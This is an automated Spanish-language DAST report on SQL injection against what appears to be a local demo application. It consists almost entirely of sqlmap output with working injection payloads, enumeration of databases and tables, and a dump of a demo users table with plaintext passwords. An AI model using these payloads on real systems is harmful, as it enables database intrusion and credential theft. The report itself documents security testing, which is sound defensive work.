# Informe DAST - SQL Injection

Fecha: 
- Timestamp: 20260427_131455
- Target: http://web.dev.local:8083

## Resumen Ejecutivo

- Vulnerabilidad detectada: true
- Vulnerabilidad explotada: true

## Vectores Analizados

- Página principal: http://web.dev.local:8083
- Links con parámetros (extraídos):


">
Ninguno encontrado en la homepage.
\nForm actions found:\n
#
\n## Hallazgos - sqlmap (detección)\n
Salida de sqlmap (detección):
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:14:55 /2026-04-27/

[13:14:55] [INFO] testing connection to the target URL
[13:14:55] [INFO] searching for forms
[1/1] Form:
GET http://web.dev.local:8083?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[13:14:55] [INFO] using '/root/.local/share/sqlmap/output/results-04272026_0114pm.csv' as the CSV results file in multiple targets mode
[13:14:55] [INFO] testing if the target URL content is stable
[13:14:56] [INFO] target URL content is stable
[13:14:56] [INFO] testing if GET parameter 'id' is dynamic
[13:14:56] [WARNING] GET parameter 'id' does not appear to be dynamic
[13:14:56] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[13:14:56] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] Y
[13:14:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:14:56] [WARNING] reflective value(s) found and filtering out
[13:14:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[13:14:56] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --string="Users")
[13:14:56] [INFO] testing 'Generic inline queries'
[13:14:56] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:14:56] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
[13:14:56] [INFO] testing 'MySQL inline queries'
[13:14:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:14:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:14:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:14:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:14:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:14:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:14:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:15:06] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:15:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:15:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:15:06] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:15:06] [INFO] target URL appears to have 2 columns in query
[13:15:06] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=7306' AND 7806=(SELECT (CASE WHEN (7806=7806) THEN 7806 ELSE (SELECT 7671 UNION SELECT 1316) END))-- -&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=7306' AND EXTRACTVALUE(3179,CONCAT(0x5c,0x7171707a71,(SELECT (ELT(3179=3179,1))),0x7162766a71)) AND 'HlRv'='HlRv&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=7306' AND (SELECT 1936 FROM (SELECT(SLEEP(5)))MPCP) AND 'ckdn'='ckdn&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=7306' UNION ALL SELECT CONCAT(0x7171707a71,0x4a4d4674474252477a45524c7065594b4962635469435179465874554b7245675a76704d65777368,0x7162766a71),NULL-- -&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[13:15:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.65, PHP 8.1.33
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[13:15:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04272026_0114pm.csv'

[*] ending @ 13:15:06 /2026-04-27/

\n## Evidencia de Explotación\n
### sqlmap_current_user.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:15:06 /2026-04-27/

[13:15:06] [INFO] testing connection to the target URL
[13:15:06] [INFO] searching for forms
[1/1] Form:
GET http://web.dev.local:8083?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[13:15:07] [INFO] resuming back-end DBMS 'mysql' 
[13:15:07] [INFO] using '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=7306' AND 7806=(SELECT (CASE WHEN (7806=7806) THEN 7806 ELSE (SELECT 7671 UNION SELECT 1316) END))-- -&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=7306' AND EXTRACTVALUE(3179,CONCAT(0x5c,0x7171707a71,(SELECT (ELT(3179=3179,1))),0x7162766a71)) AND 'HlRv'='HlRv&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=7306' AND (SELECT 1936 FROM (SELECT(SLEEP(5)))MPCP) AND 'ckdn'='ckdn&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=7306' UNION ALL SELECT CONCAT(0x7171707a71,0x4a4d4674474252477a45524c7065594b4962635469435179465874554b7245675a76704d65777368,0x7162766a71),NULL-- -&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[13:15:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.1.33, Apache 2.4.65
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[13:15:07] [INFO] fetching current user
[13:15:07] [WARNING] reflective value(s) found and filtering out
current user: 'root@%'
[13:15:07] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv'

[*] ending @ 13:15:07 /2026-04-27/

### sqlmap_dbs.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:15:07 /2026-04-27/

[13:15:07] [INFO] testing connection to the target URL
[13:15:07] [INFO] searching for forms
[1/1] Form:
GET http://web.dev.local:8083?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[13:15:07] [INFO] resuming back-end DBMS 'mysql' 
[13:15:07] [INFO] using '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=7306' AND 7806=(SELECT (CASE WHEN (7806=7806) THEN 7806 ELSE (SELECT 7671 UNION SELECT 1316) END))-- -&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=7306' AND EXTRACTVALUE(3179,CONCAT(0x5c,0x7171707a71,(SELECT (ELT(3179=3179,1))),0x7162766a71)) AND 'HlRv'='HlRv&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=7306' AND (SELECT 1936 FROM (SELECT(SLEEP(5)))MPCP) AND 'ckdn'='ckdn&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=7306' UNION ALL SELECT CONCAT(0x7171707a71,0x4a4d4674474252477a45524c7065594b4962635469435179465874554b7245675a76704d65777368,0x7162766a71),NULL-- -&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[13:15:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.1.33, Apache 2.4.65
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[13:15:07] [INFO] fetching database names
[13:15:07] [WARNING] reflective value(s) found and filtering out
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys

[13:15:07] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv'

[*] ending @ 13:15:07 /2026-04-27/

### sqlmap_tables.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:15:07 /2026-04-27/

[13:15:07] [INFO] testing connection to the target URL
[13:15:07] [INFO] searching for forms
[1/1] Form:
GET http://web.dev.local:8083?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[13:15:08] [INFO] resuming back-end DBMS 'mysql' 
[13:15:08] [INFO] using '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=7306' AND 7806=(SELECT (CASE WHEN (7806=7806) THEN 7806 ELSE (SELECT 7671 UNION SELECT 1316) END))-- -&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=7306' AND EXTRACTVALUE(3179,CONCAT(0x5c,0x7171707a71,(SELECT (ELT(3179=3179,1))),0x7162766a71)) AND 'HlRv'='HlRv&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=7306' AND (SELECT 1936 FROM (SELECT(SLEEP(5)))MPCP) AND 'ckdn'='ckdn&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=7306' UNION ALL SELECT CONCAT(0x7171707a71,0x4a4d4674474252477a45524c7065594b4962635469435179465874554b7245675a76704d65777368,0x7162766a71),NULL-- -&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[13:15:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.1.33, Apache 2.4.65
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[13:15:08] [INFO] fetching database names
[13:15:08] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, sqli_demo, sys'
[13:15:08] [WARNING] reflective value(s) found and filtering out
Database: information_schema
[79 tables]
+------------------------------------------------------+
| ALL_PLUGINS                                          |
| APPLICABLE_ROLES                                     |
| CHARACTER_SETS                                       |
| CHECK_CONSTRAINTS                                    |
| CLIENT_STATISTICS                                    |
| COLLATIONS                                           |
| COLLATION_CHARACTER_SET_APPLICABILITY                |
| COLUMN_PRIVILEGES                                    |
| ENABLED_ROLES                                        |
| FILES                                                |
| GEOMETRY_COLUMNS                                     |
| GLOBAL_STATUS                                        |
| GLOBAL_VARIABLES                                     |
| INDEX_STATISTICS                                     |
| INNODB_BUFFER_PAGE                                   |
| INNODB_BUFFER_PAGE_LRU                               |
| INNODB_BUFFER_POOL_STATS                             |
| INNODB_CMP                                           |
| INNODB_CMPMEM                                        |
| INNODB_CMPMEM_RESET                                  |
| INNODB_CMP_PER_INDEX                                 |
| INNODB_CMP_PER_INDEX_RESET                           |
| INNODB_CMP_RESET                                     |
| INNODB_FT_BEING_DELETED                              |
| INNODB_FT_CONFIG                                     |
| INNODB_FT_DEFAULT_STOPWORD                           |
| INNODB_FT_DELETED                                    |
| INNODB_FT_INDEX_CACHE                                |
| INNODB_FT_INDEX_TABLE                                |
| INNODB_LOCKS                                         |
| INNODB_LOCK_WAITS                                    |
| INNODB_METRICS                                       |
| INNODB_SYS_COLUMNS                                   |
| INNODB_SYS_FIELDS                                    |
| INNODB_SYS_FOREIGN                                   |
| INNODB_SYS_FOREIGN_COLS                              |
| INNODB_SYS_INDEXES                                   |
| INNODB_SYS_TABLES                                    |
| INNODB_SYS_TABLESPACES                               |
| INNODB_SYS_TABLESTATS                                |
| INNODB_SYS_VIRTUAL                                   |
| INNODB_TABLESPACES_ENCRYPTION                        |
| INNODB_TRX                                           |
| KEYWORDS                                             |
| KEY_CACHES                                           |
| KEY_COLUMN_USAGE                                     |
| OPTIMIZER_TRACE                                      |
| PARAMETERS                                           |
| PROFILING                                            |
| REFERENTIAL_CONSTRAINTS                              |
| ROUTINES                                             |
| SCHEMATA                                             |
| SCHEMA_PRIVILEGES                                    |
| SESSION_STATUS                                       |
| SESSION_VARIABLES                                    |
| SPATIAL_REF_SYS                                      |
| SQL_FUNCTIONS                                        |
| STATISTICS                                           |
| SYSTEM_VARIABLES                                     |
| TABLESPACES                                          |
| TABLE_CONSTRAINTS                                    |
| TABLE_PRIVILEGES                                     |
| TABLE_STATISTICS                                     |
| THREAD_POOL_GROUPS                                   |
| THREAD_POOL_QUEUES                                   |
| THREAD_POOL_STATS                                    |
| THREAD_POOL_WAITS                                    |
| USER_PRIVILEGES                                      |
| USER_STATISTICS                                      |
| VIEWS                                                |
| COLUMNS                                              |
| ENGINES                                              |
| EVENTS                                               |
| PARTITIONS                                           |
| PLUGINS                                              |
| PROCESSLIST                                          |
| TABLES                                               |
| TRIGGERS                                             |
| user_variables                                       |
+------------------------------------------------------+

Database: sqli_demo
[1 table]
+------------------------------------------------------+
| users                                                |
+------------------------------------------------------+

Database: sys
[101 tables]
+------------------------------------------------------+
| processlist                                          |
| session                                              |
| version                                              |
| host_summary                                         |
| host_summary_by_file_io                              |
| host_summary_by_file_io_type                         |
| host_summary_by_stages                               |
| host_summary_by_statement_latency                    |
| host_summary_by_statement_type                       |
| innodb_buffer_stats_by_schema                        |
| innodb_buffer_stats_by_table                         |
| innodb_lock_waits                                    |
| io_by_thread_by_latency                              |
| io_global_by_file_by_bytes                           |
| io_global_by_file_by_latency                         |
| io_global_by_wait_by_bytes                           |
| io_global_by_wait_by_latency                         |
| latest_file_io                                       |
| memory_by_host_by_current_bytes                      |
| memory_by_thread_by_current_bytes                    |
| memory_by_user_by_current_bytes                      |
| memory_global_by_current_bytes                       |
| memory_global_total                                  |
| metrics                                              |
| ps_check_lost_instrumentation                        |
| schema_auto_increment_columns                        |
| schema_index_statistics                              |
| schema_object_overview                               |
| schema_redundant_indexes                             |
| schema_table_lock_waits                              |
| schema_table_statistics                              |
| schema_table_statistics_with_buffer                  |
| schema_tables_with_full_table_scans                  |
| schema_unused_indexes                                |
| session_ssl_status                                   |
| statement_analysis                                   |
| statements_with_errors_or_warnings                   |
| statements_with_full_table_scans                     |
| statements_with_runtimes_in_95th_percentile          |
| statements_with_sorting                              |
| statements_with_temp_tables                          |
| sys_config                                           |
| user_summary                                         |
| user_summary_by_file_io                              |
| user_summary_by_file_io_type                         |
| user_summary_by_stages                               |
| user_summary_by_statement_latency                    |
| user_summary_by_statement_type                       |
| wait_classes_global_by_avg_latency                   |
| wait_classes_global_by_latency                       |
| waits_by_host_by_latency                             |
| waits_by_user_by_latency                             |
| waits_global_by_latency                              |
| x$host_summary                                       |
| x$host_summary_by_file_io                            |
| x$host_summary_by_file_io_type                       |
| x$host_summary_by_stages                             |
| x$host_summary_by_statement_latency                  |
| x$host_summary_by_statement_type                     |
| x$innodb_buffer_stats_by_schema                      |
| x$innodb_buffer_stats_by_table                       |
| x$innodb_lock_waits                                  |
| x$io_by_thread_by_latency                            |
| x$io_global_by_file_by_bytes                         |
| x$io_global_by_file_by_latency                       |
| x$io_global_by_wait_by_bytes                         |
| x$io_global_by_wait_by_latency                       |
| x$latest_file_io                                     |
| x$memory_by_host_by_current_bytes                    |
| x$memory_by_thread_by_current_bytes                  |
| x$memory_by_user_by_current_bytes                    |
| x$memory_global_by_current_bytes                     |
| x$memory_global_total                                |
| x$processlist                                        |
| x$ps_digest_95th_percentile_by_avg_us                |
| x$ps_digest_avg_latency_distribution                 |
| x$ps_schema_table_statistics_io                      |
| x$schema_flattened_keys                              |
| x$schema_index_statistics                            |
| x$schema_table_lock_waits                            |
| x$schema_table_statistics                            |
| x$schema_table_statistics_with_buffer                |
| x$schema_tables_with_full_table_scans                |
| x$session                                            |
| x$statement_analysis                                 |
| x$statements_with_errors_or_warnings                 |
| x$statements_with_full_table_scans                   |
| x$statements_with_runtimes_in_95th_percentile        |
| x$statements_with_sorting                            |
| x$statements_with_temp_tables                        |
| x$user_summary                                       |
| x$user_summary_by_file_io                            |
| x$user_summary_by_file_io_type                       |
| x$user_summary_by_stages                             |
| x$user_summary_by_statement_latency                  |
| x$user_summary_by_statement_type                     |
| x$wait_classes_global_by_avg_latency                 |
| x$wait_classes_global_by_latency                     |
| x$waits_by_host_by_latency                           |
| x$waits_by_user_by_latency                           |
| x$waits_global_by_latency                            |
+------------------------------------------------------+

Database: mysql
[31 tables]
+------------------------------------------------------+
| event                                                |
| plugin                                               |
| user                                                 |
| column_stats                                         |
| columns_priv                                         |
| db                                                   |
| func                                                 |
| general_log                                          |
| global_priv                                          |
| gtid_slave_pos                                       |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| index_stats                                          |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| proc                                                 |
| procs_priv                                           |
| proxies_priv                                         |
| roles_mapping                                        |
| servers                                              |
| slow_log                                             |
| table_stats                                          |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
| transaction_registry                                 |
+------------------------------------------------------+

Database: performance_schema
[81 tables]
+------------------------------------------------------+
| hosts                                                |
| accounts                                             |
| cond_instances                                       |
| events_stages_current                                |
| events_stages_history                                |
| events_stages_history_long                           |
| events_stages_summary_by_account_by_event_name       |
| events_stages_summary_by_host_by_event_name          |
| events_stages_summary_by_thread_by_event_name        |
| events_stages_summary_by_user_by_event_name          |
| events_stages_summary_global_by_event_name           |
| events_statements_current                            |
| events_statements_history                            |
| events_statements_history_long                       |
| events_statements_summary_by_account_by_event_name   |
| events_statements_summary_by_digest                  |
| events_statements_summary_by_host_by_event_name      |
| events_statements_summary_by_program                 |
| events_statements_summary_by_thread_by_event_name    |
| events_statements_summary_by_user_by_event_name      |
| events_statements_summary_global_by_event_name       |
| events_transactions_current                          |
| events_transactions_history                          |
| events_transactions_history_long                     |
| events_transactions_summary_by_account_by_event_name |
| events_transactions_summary_by_host_by_event_name    |
| events_transactions_summary_by_thread_by_event_name  |
| events_transactions_summary_by_user_by_event_name    |
| events_transactions_summary_global_by_event_name     |
| events_waits_current                                 |
| events_waits_history                                 |
| events_waits_history_long                            |
| events_waits_summary_by_account_by_event_name        |
| events_waits_summary_by_host_by_event_name           |
| events_waits_summary_by_instance                     |
| events_waits_summary_by_thread_by_event_name         |
| events_waits_summary_by_user_by_event_name           |
| events_waits_summary_global_by_event_name            |
| file_instances                                       |
| file_summary_by_event_name                           |
| file_summary_by_instance                             |
| global_status                                        |
| host_cache                                           |
| memory_summary_by_account_by_event_name              |
| memory_summary_by_host_by_event_name                 |
| memory_summary_by_thread_by_event_name               |
| memory_summary_by_user_by_event_name                 |
| memory_summary_global_by_event_name                  |
| metadata_locks                                       |
| mutex_instances                                      |
| objects_summary_global_by_type                       |
| performance_timers                                   |
| prepared_statements_instances                        |
| replication_applier_configuration                    |
| replication_applier_status                           |
| replication_applier_status_by_coordinator            |
| replication_applier_status_by_worker                 |
| replication_connection_configuration                 |
| rwlock_instances                                     |
| session_account_connect_attrs                        |
| session_connect_attrs                                |
| session_status                                       |
| setup_actors                                         |
| setup_consumers                                      |
| setup_instruments                                    |
| setup_objects                                        |
| setup_timers                                         |
| socket_instances                                     |
| socket_summary_by_event_name                         |
| socket_summary_by_instance                           |
| status_by_account                                    |
| status_by_host                                       |
| status_by_thread                                     |
| status_by_user                                       |
| table_handles                                        |
| table_io_waits_summary_by_index_usage                |
| table_io_waits_summary_by_table                      |
| table_lock_waits_summary_by_table                    |
| threads                                              |
| user_variables_by_thread                             |
| users                                                |
+------------------------------------------------------+

[13:15:08] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv'

[*] ending @ 13:15:08 /2026-04-27/

### sqlmap_dump.txt
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:15:08 /2026-04-27/

[13:15:08] [INFO] testing connection to the target URL
[13:15:08] [INFO] searching for forms
[1/1] Form:
GET http://web.dev.local:8083?id=&Submit=Submit
do you want to test this form? [Y/n/q] 
> Y
Edit GET data [default: id=&Submit=Submit]: id=&Submit=Submit
do you want to fill blank fields with random values? [Y/n] Y
[13:15:08] [INFO] resuming back-end DBMS 'mysql' 
[13:15:08] [INFO] using '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=7306' AND 7806=(SELECT (CASE WHEN (7806=7806) THEN 7806 ELSE (SELECT 7671 UNION SELECT 1316) END))-- -&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=7306' AND EXTRACTVALUE(3179,CONCAT(0x5c,0x7171707a71,(SELECT (ELT(3179=3179,1))),0x7162766a71)) AND 'HlRv'='HlRv&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=7306' AND (SELECT 1936 FROM (SELECT(SLEEP(5)))MPCP) AND 'ckdn'='ckdn&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=7306' UNION ALL SELECT CONCAT(0x7171707a71,0x4a4d4674474252477a45524c7065594b4962635469435179465874554b7245675a76704d65777368,0x7162766a71),NULL-- -&Submit=Submit
---
do you want to exploit this SQL injection? [Y/n] Y
[13:15:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.65, PHP 8.1.33
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[13:15:08] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:15:08] [INFO] fetching current database
[13:15:08] [WARNING] reflective value(s) found and filtering out
[13:15:08] [INFO] fetching tables for database: 'sqli_demo'
[13:15:08] [INFO] fetching columns for table 'users' in database 'sqli_demo'
[13:15:08] [INFO] fetching entries for table 'users' in database 'sqli_demo'
Database: sqli_demo
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+

[13:15:08] [INFO] table 'sqli_demo.users' dumped to CSV file '/root/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv'
[13:15:08] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04272026_0115pm.csv'

[*] ending @ 13:15:08 /2026-04-27/

\n## Conclusión\n
Vulnerabilidad encontrada: true
Vulnerabilidad explotada: true
